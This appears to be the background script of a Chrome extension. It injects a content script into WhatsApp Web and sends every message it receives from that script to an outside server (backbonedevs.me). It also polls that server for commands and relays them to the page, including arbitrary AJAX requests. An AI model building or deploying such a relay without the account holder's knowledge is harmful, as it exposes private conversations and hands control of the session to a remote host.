/*
This variable is responsible for keeping track of the active WhatsApp tab.
It is updated once the tab communicates with the background page (sends a type:start request)
*/
var whatsapp_tab_id = -1;

/*
Injecting the content script into the WhatsApp webpage and reseting the connection settings to the host.
*/
chrome.webNavigation.onCompleted.addListener(function(details) {
	
	if (~details.url.indexOf("https://web.whatsapp.com/")) {
		console.log("Injecting");	
		
		whatsapp_tab_id = details.tabId;
		console.log(whatsapp_tab_id);
		
		// Injecting the content script into the page.		
		chrome.tabs.executeScript(details.tabId, {file: "js/content.js"});

		askServer({"message":"empyt"});
	}
	
});

/*
Passes a message to the client (dict-obj)
Full journey from here - to content script, then to the webpage through the DOM
*/
function clientMessage(data) {
	chrome.tabs.sendMessage(whatsapp_tab_id, data);
}

/*
Listening to messages from the content script (webpage -> content script -> *backgrund page* -> host)
*/


chrome.runtime.onMessage.addListener(function(request, sender) {
	if (sender.tab) {
		// From content script
		//console.log("Background page received: ", request, sender);
		//console.log(request);
		console.log(httpGet("https://www.backbonedevs.me/admin/whatsapp/send/"+encodeURIComponent(request)));
		if (request.type == "ajax") {
			var m = request.ajax;
			m.success = function(e) {
				clientMessage({type: "ajax", ajax_id: request.ajax_id, status: "success", e: e});
			};
			m.error = function(a, b, c) {
				clientMessage({type: "ajax", ajax_id: request.ajax_id, status: "error", a: a, b: b, c: c});
			};
			$.ajax(m);
		}
	}
});


function httpGet(theUrl,id)
{
	var xhr = new XMLHttpRequest();
	xhr.open("GET", theUrl, true);
	xhr.onreadystatechange = function() {
	  if (xhr.readyState == 4) {
	    // WARNING! Might be injecting a malicious script!
	    if(id == 1){
	    	askServer(JSON.parse(xhr.responseText+""));
	    	//console.log(JSON.parse(xhr.responseText+""));
	    }else{
	    	console.log(JSON.parse(xhr.responseText+""));
	    }
	  }
	}
	xhr.send();
}

function askServer(a){
	
	if(a.message != "empyt"){
		//console.log("Pegou");
		clientMessage(a);
		httpGet("https://www.backbonedevs.me/admin/whatsapp/receiver/sender-"+a.return,1);
	}else{
		//console.log("Pegou");
		httpGet("https://www.backbonedevs.me/admin/whatsapp/receiver/empyt-0",1);
	}
}

setTimeout(function(){location.reload();},21600000);